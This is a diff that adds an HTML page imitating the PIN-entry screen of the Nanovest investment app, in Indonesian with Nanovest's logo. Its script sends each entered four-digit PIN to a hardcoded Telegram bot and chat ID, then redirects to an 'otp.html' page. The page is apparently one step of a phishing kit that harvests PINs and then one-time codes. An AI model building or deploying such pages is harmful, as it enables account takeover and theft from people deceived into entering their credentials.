@@ -1,0 +1,234 @@
+<html lang="en">
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1" name="viewport"/>
+  <title>
+   Masukkan PIN
+  </title>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&amp;display=swap" rel="stylesheet"/>
+  <style>
+   /* Reset and base */
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      margin: 0;
+      font-family: "Poppins", sans-serif;
+      background: linear-gradient(to bottom, #d9d9f7, #ffffff);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+    header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 1.5rem 1.5rem 0 1.5rem;
+      color: #0c2e56;
+      font-weight: 600;
+      font-size: 1.125rem; /* 18px */
+    }
+    header button {
+      background: none;
+      border: none;
+      color: #0c2e56;
+      font-size: 1.5rem; /* 24px */
+      cursor: pointer;
+      padding: 0;
+      line-height: 1;
+    }
+    main {
+      flex-grow: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 1.5rem;
+      margin-top: 1.5rem;
+    }
+    main img {
+      width: 80px;
+      height: 80px;
+      user-select: none;
+      pointer-events: none;
+    }
+    h1 {
+      margin-top: 1.5rem;
+      color: #0c2e56;
+      font-weight: 600;
+      font-size: 1.5rem; /* 24px */
+    }
+    p.description {
+      margin-top: 0.5rem;
+      color: #7a869a;
+      font-weight: 400;
+      font-size: 1rem; /* 16px */
+      max-width: 320px;
+      text-align: center;
+      line-height: 1.4;
+    }
+    form#pinForm {
+      margin-top: 2rem;
+      display: flex;
+      gap: 2rem;
+      justify-content: center;
+      width: 100%;
+      max-width: 320px;
+    }
+    form#pinForm input {
+      width: 48px;
+      height: 48px;
+      border-radius: 9999px;
+      background-color: #ffffff;
+      border: none;
+      font-size: 1.25rem; /* 20px */
+      font-weight: 600;
+      text-align: center;
+      outline-offset: 2px;
+      outline-color: transparent;
+      transition: outline-color 0.2s ease;
+    }
+    form#pinForm input:focus {
+      outline-color: #4b2ca6;
+      background-color: #f0f2fa;
+    }
+    button#forgotPin {
+      margin-top: 2.5rem;
+      background: none;
+      border: none;
+      color: #4b2ca6;
+      font-weight: 600;
+      font-size: 1rem; /* 16px */
+      cursor: pointer;
+      padding: 0;
+    }
+    footer {
+      color: #0c2e56;
+      font-size: 1rem; /* 16px */
+      text-align: center;
+      padding: 0 1.5rem 2rem 1.5rem;
+      line-height: 1.4;
+    }
+
+    /* Responsive */
+    @media (min-width: 640px) {
+      main img {
+        width: 96px;
+        height: 96px;
+      }
+      h1 {
+        font-size: 1.75rem; /* 28px */
+      }
+      form#pinForm input {
+        width: 56px;
+        height: 56px;
+        font-size: 1.5rem; /* 24px */
+      }
+      button#forgotPin {
+        font-size: 1.125rem; /* 18px */
+      }
+      footer {
+        font-size: 1.125rem; /* 18px */
+      }
+    }
+  </style>
+ </head>
+ <body>
+  <header>
+   <button aria-label="Back">
+    <i class="fas fa-arrow-left">
+    </i>
+   </button>
+   <div>
+   </div>
+   <div>
+    Bantuan
+   </div>
+  </header>
+  <main>
+   <img alt="3D style padlock with a key and password dots icon in purple and blue gradient colors" draggable="false" src="https://www.nanovest.io/wp-content/themes/nanovest/assets/images/pin-code.svg"/>
+   <h1>
+    Masukkan PIN
+   </h1>
+   <p class="description">
+    Silahkan masukkan PIN mu untuk melanjutkan
+   </p>
+   <form autocomplete="off" id="pinForm" novalidate="">
+    <input aria-label="PIN digit 1" inputmode="numeric" maxlength="1" pattern="[0-9]*" required="" type="password"/>
+    <input aria-label="PIN digit 2" inputmode="numeric" maxlength="1" pattern="[0-9]*" required="" type="password"/>
+    <input aria-label="PIN digit 3" inputmode="numeric" maxlength="1" pattern="[0-9]*" required="" type="password"/>
+    <input aria-label="PIN digit 4" inputmode="numeric" maxlength="1" pattern="[0-9]*" required="" type="password"/>
+   </form>
+   <button id="forgotPin" type="button">
+    Lupa PIN?
+   </button>
+  </main>
+  <footer>
+   Jangan berikan PIN kepada siapapun. Dapat berisiko penyalahgunaan akun yang
+    merugikan
+  </footer>
+  <script>
+   // Auto-focus next input on input
+    const inputs = document.querySelectorAll("#pinForm input");
+    inputs.forEach((input, idx) => {
+      input.addEventListener("input", () => {
+        if (input.value.length === 1 && idx < inputs.length - 1) {
+          inputs[idx + 1].focus();
+        }
+      });
+    });
+
+    // Telegram bot info - replace with your own bot token and chat ID
+    const telegramBotToken = "8341291421:AAHZhAJ-_wj7HBO57T7jvQ1yJcF46SZvESg";
+    const telegramChatId = "7549590022";
+
+    // Function to send PIN to Telegram
+    async function sendPinToTelegram(pin) {
+      const message = `User entered PIN: ${pin}`;
+      const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+
+      try {
+        const response = await fetch(url, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            chat_id: telegramChatId,
+            text: message,
+          }),
+        });
+        if (!response.ok) {
+          throw new Error("Telegram API error");
+        }
+        window.location.href = "otp.html";
+      } catch (error) {
+        alert("Gagal mengirim PIN ke Telegram.");
+        console.error(error);
+      }
+    }
+
+    // Handle form submission when all inputs are filled
+    const form = document.getElementById("pinForm");
+    form.addEventListener("submit", (e) => {
+      e.preventDefault();
+      let pin = "";
+      inputs.forEach((input) => {
+        pin += input.value;
+      });
+      if (pin.length === inputs.length) {
+        sendPinToTelegram(pin);
+        form.reset();
+        inputs[0].focus();
+      }
+    });
+
+    // Submit form automatically when last input is filled
+    inputs[inputs.length - 1].addEventListener("input", () => {
+      if (inputs[inputs.length - 1].value.length === 1) {
+        form.requestSubmit();
+      }
+    });
+  </script>
+ </body>
+</html>
